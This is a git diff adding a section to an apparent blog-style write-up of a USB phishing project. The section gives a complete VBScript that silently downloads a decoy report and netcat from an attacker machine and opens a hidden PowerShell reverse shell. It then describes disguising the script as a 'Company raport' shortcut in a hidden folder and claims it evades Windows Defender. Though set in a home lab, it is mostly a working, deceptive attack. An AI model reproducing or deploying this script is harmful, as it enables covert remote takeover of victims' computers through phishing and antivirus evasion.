@@ -220,6 +220,69 @@ void loop() {
 
 Back to the reverse shell. After playing with Digispark for so long, I decided to play with the USB reverse shell stuff.
 
-Trying to add some stealth to our previous reveshe shell script, I stumbled across this discussion on [StackOverflow](https://stackoverflow.com/questions/13142603/prevent-vbscript-app-from-showing-console-window) about running cmd commands silently. 
+Trying to add some stealth to our previous reveshe shell script, I first tried some powershell variations of the code, but the terminal window still kept flashing briefly on the screen, which I wasnt happy about. Moving on!
+
+I stumbled across this discussion on [StackOverflow](https://stackoverflow.com/questions/13142603/prevent-vbscript-app-from-showing-console-window) about running cmd commands silently. With VBScript it is possible to execute multiple commands, so I had an idea to include a fake report.txt file to be downloadead along with netcat while opening up the company report file.
+
+With lots of tinkering and testing with the code, I managed to make it do just what I wanted: Download the fake raport.txt & netcat from my Kali machine and execute the reverse shell in all silence in the Windows machine.
+
+This is what I put in the revsh.vbs file:
+
+```vbs
+Set objShell = CreateObject("Wscript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Download fake raport
+downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/raport.txt', '%TEMP%\raport.txt')"""
+objShell.Run downloadRaport, 0, True
+    WScript.Sleep 1000  ' Wait for 2 second
+
+' Open raport.txt
+openRaport = "cmd /c start """" %TEMP%\raport.txt"
+objShell.Run openRaport, 0, True
+
+' Download netcat from attacker ip
+downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/nc64.exe', '%TEMP%\nc64.exe')"""
+objShell.Run downloadCmd, 0, True
+WScript.Sleep 2000 ' Wait for 2 seconds initially (adjust this if needed)
+
+' Wait until the file has been downloaded
+Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\nc64.exe"))
+    WScript.Sleep 1000  ' Wait for 1 second
+Loop
+
+' Start reverse shell
+execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '192.168.56.3', '9001', '-e', 'powershell' -WindowStyle Hidden"""
+objShell.Run execCmd, 0, True
+
+Set objFSO = Nothing
+Set objShell = Nothing
+```
+Next thing I did was adding a shortcut to the script that I had put in a hidden folder called payload.
+
+![2023-11-22_02-58](https://github.com/therealhalonen/PhishSticks/assets/112076418/095a2b9d-1401-43ad-bd93-e37d42bdd8ed)
+
+After that I chose a new icon for the shortcut and I unticked the box to show hidden items. On most systems this is off by default, which is why this attack has a high chance to work, since the victim wont see the payload folder.
+
+![2023-11-21_21-39](https://github.com/therealhalonen/PhishSticks/assets/112076418/07159048-d3c1-496f-a052-63e84d8a5b8e)
+
+Next thing to do is to set up my Kali machine with netcat listener and python server for file hosting. Inside ~/Attacker/payloads folder I had nc64.exe and raport.txt ready to be downloaded.
+
+![2023-11-22_03-13](https://github.com/therealhalonen/PhishSticks/assets/112076418/f331c4b0-5def-488b-8cdf-f0bec94cfe23)
+
+After double clicking the Company raport shortcut, magic starts to happen:
+
+Files get downloaded from the Kali machine and reverse shell is done!
+
+![2023-11-22_03-20](https://github.com/therealhalonen/PhishSticks/assets/112076418/17bb785d-7196-4e76-a57d-e0d0c5923525)
+
+And in exchange for the reverse shell, the Windows machine (victim) gets this beautiful report from Big Company:
+
+![2023-11-22_03-22](https://github.com/therealhalonen/PhishSticks/assets/112076418/2afa5007-0508-42ac-a1e8-cfef6e909ee8)
+
+Pretty stealth! And it bypasses Windows Defender!!
+
+Video of it in action: https://www.youtube.com/watch?v=ll4ojo6q-rM
+
 
 
